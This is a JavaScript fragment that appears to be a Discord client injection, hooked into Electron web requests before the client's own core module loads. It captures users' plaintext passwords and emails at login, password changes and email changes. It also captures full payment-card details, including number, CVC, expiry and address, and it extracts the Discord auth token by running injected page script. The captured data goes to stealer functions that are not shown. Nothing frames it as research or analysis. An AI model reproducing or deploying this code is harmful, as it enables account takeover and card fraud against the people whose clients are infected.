session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
	if (details.url.endsWith("login")) {
		if (details.statusCode == 200) {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			const email = data.login;
			const password = data.password;
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
				Login(email, password, token)
			}))
		} else {}
	}
	if (details.url.endsWith("users/@me")) {
		if (details.statusCode == 200 && details.method == "PATCH") {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			if (data.password != null && data.password != undefined && data.password != "") {
				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangePassword(data.password, data.new_password, token)
					}))
				}
				if (data.email != null && data.email != undefined && data.email != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangeEmail(data.email, data.password, token)
					}))
				}
			}
		} else {}
	}
	if (details.url.endsWith("tokens")) {
		const window = BrowserWindow.getAllWindows()[0];
		const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
		window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
			CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
		})).catch(console.error);
	}
});


module.exports = require('./core.asar')
